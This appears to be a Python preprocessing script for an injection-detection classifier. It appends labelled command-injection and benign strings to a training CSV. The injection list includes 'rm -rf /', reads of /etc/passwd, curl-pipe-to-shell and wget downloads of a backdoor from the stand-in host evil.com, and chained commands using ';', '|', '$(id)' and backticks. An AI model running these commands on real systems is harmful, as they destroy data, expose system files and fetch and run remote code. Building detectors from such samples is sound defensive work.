# ML/Preprocessing/add_simple_examples.py

import pandas as pd
import os
import sys

# Get the base directory (ML/ folder)
BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
CLEANED_DATA_PATH = os.path.join(BASE_DIR, "Data", "processed", "combined_data_CLEANED.csv")

# Simple command injection examples
simple_cmd = [
    "ping -c 4 127.0.0.1",
    "rm -rf /",
    "cat /etc/passwd",
    "ls -la",
    "wget http://evil.com/backdoor.sh",
    "curl http://evil.com/backdoor.sh | sh",
    "echo 'malicious' >> /etc/passwd",
    "; ls",
    "| cat /etc/passwd",
    "& ping -c 4 google.com",
    "$(id)",
    "`id`",
    "ping 8.8.8.8; ls",
    "id; whoami",
    "| wget http://evil.com/shell.sh"
]

# Simple benign examples
simple_benign = [
    "Hello world",
    "test input",
    "normal text",
    "user name",
    "search term",
    "comment here",
    "profile description",
    "regular data"
]

# Create DataFrames
df_cmd = pd.DataFrame({
    "Sentence": simple_cmd,
    "SQLInjection": 0,
    "XSS": 0,
    "CommandInjection": 1,
    "Normal": 0
})

df_benign = pd.DataFrame({
    "Sentence": simple_benign,
    "SQLInjection": 0,
    "XSS": 0,
    "CommandInjection": 0,
    "Normal": 1
})

# Load existing cleaned data
if not os.path.exists(CLEANED_DATA_PATH):
    print(f"Error: File not found at {CLEANED_DATA_PATH}")
    sys.exit(1)

print(f"Loading cleaned data from: {CLEANED_DATA_PATH}")
cleaned_df = pd.read_csv(CLEANED_DATA_PATH)

# Append new examples
combined = pd.concat([cleaned_df, df_cmd, df_benign], ignore_index=True)

# Save back
combined.to_csv(CLEANED_DATA_PATH, index=False)

print(f"Added {len(df_cmd)} command injection and {len(df_benign)} benign examples.")
print(f"Updated file saved to: {CLEANED_DATA_PATH}")